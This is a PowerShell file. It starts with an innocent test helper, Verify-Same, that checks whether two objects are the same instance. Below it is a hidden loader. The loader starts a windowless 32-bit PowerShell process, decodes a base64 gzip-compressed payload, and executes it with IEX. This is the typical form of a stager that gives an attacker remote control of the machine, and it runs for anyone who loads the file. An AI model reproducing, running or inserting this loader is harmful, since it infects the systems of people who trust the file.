function Verify-Same {
    param (
        [Parameter(ValueFromPipeline = $true)]
        $Actual,
        [Parameter(Mandatory = $true, Position = 0)]
        $Expected
    )

    if (-not [object]::ReferenceEquals($Expected, $Actual)) {
        throw [Exception]"Expected the objects to be the same instance but they were not."
    }

    $Actual
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAEq3d1gCA7VWbW/iOBD+3JX2P0QrpCRaSoDS7Yu00jmEl7TQAoHQwKKVmzjB1MQ0cShwt//9JkBa9rY99Va6qBV2PGM/88wznvhJ6ArKQylY9U/1YCSkPz9+OOrgCM8lJee6aNltLS9m07yUI5G+cq7qbstqqEdHYJWbnZis2xshV/oqKWO0WBh8jmk4ubysJlFEQrGbFxpEoDgm83tGSayo0l/ScEoicnx7PyMunCjlvhcajN9jtjdbV7E7JdIxCr10rcVdnIIsWAtGhSJ/+yar4+PSpFB7TDCLFdlax4LMCx5jsir9UNMD++sFUeQ2dSMec18UhjQ8KRcGYYx9cgO7LUmbiCn3YlmFUOAvIiKJQuklqHSXnY0iw7ATcRd5XkRicCmY4ZI/ECUXJozlpT+U8R5CLwkFnRNYFyTiC4tES+qSuNDEocdIj/gT5YY8ZZG/10k5dAKrjojUPOTnLaxt7iWM7Nxl9Ve0B4lV4flHcoGQHx8/fPzgZ9q4b4ak9Z2Zh9qA0dF4OyYAWunwmG5tv0rFvNSGk7Hg0RqmuX6UEHUijdOMjCcTKRc71fzb7qXMFizd03BW3ty36J1jwdLY5tSbgOs+ZTn+nfWtqHaSrr0tP4P4NCTGOsRz6mYKU17LA/EZ2YZcyMxuAKAi7xeIZxBGAixSUvPS+Fe32pyKZ189ocwjEXIhlzGggjSrP4PZ5UmRzbBN5kDXbi5DPnzQNcms91peZ6enczCSqwzHcV7qJFBYbl6yCGbEy0sojOl+CSWCb4fyC9x2wgR1cSyy7SbqIZf7M6s8jEWUuJBFiL9vLYhLMUvpyEtN6hF9bdEgO1t+lYwqZoyGAey0hGTAm5QES6TaiABmqgO1YBFhzheMzMFkW+R1hgMo6X1NbLWEA+LJr4HMJL/Td0pJxsUBRMizxbjISzaNBNwXKb2HwvotJAcXxjOmakT2yVGyEhrra5GKPrfZ8LNUpXuWtpxEAvioR3yu45h8qVgiAraUT9otrSJ4HDNkbVd/oCX0REtmG/4H9MTkxpl3fTVrapGxmvrIjM12s2N0m83K8sqyK8KqmeK6Y4p27W42s1CzN3DEyETNPi0+OJXN4opurBbynJX2ZaNvnor6ajMLPN8xfD84861e6bROW8NqVy+WccuoJa2h/qQXK3GNPjW7dNB9uKqLe8dmeOBrwV3pAtNVK5rZJd7emAg1pifu5sq3G9O2t3aa2sWw8oBqCFXDml3X+bWjR6ij2TiwedJrrmrlAGJtnFEy6g7qerdb19GgMXs0LrQAfO/wVB/aZTpa3PWmMK8DhGutWDE9suFOF0hqcISDHtgE1bI79cHG+Iz0zzc8LuMHnSMdbOqjR8DlLOodBuv9QZkjm93cYdQareuaVnI6FdQs0mEjQOmWONC7GMVLY2NoJdvj3vD0xvE1+46daUa1v3B9TdOemsa1Oyqtzm/PzltDas85Gmia/SnVBogjR+3BQbrfuuDbOIqnmIEM4NLOyrHOo/r+5u1wmnooynN3fiBRSBh0Muh1maARY9xN+8HzPQ39aNclJlCYAxielF8dqdKzofrSJrJXl5cjQAvlkYq30CJhIKb54uqkWIQrvriqFCHY90dY5Yu1st0qn7aIlKFsa7bdWk0LJheuz/9/4vaVOoUf7z3Evbz7l9V3kVnMbwP/5e3PL/4Tsb/FwBBTAdYW3DiM7Lrg20TsxXL4IbE+ByX4+yf9ortNxPENfF78DUWrikBRCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

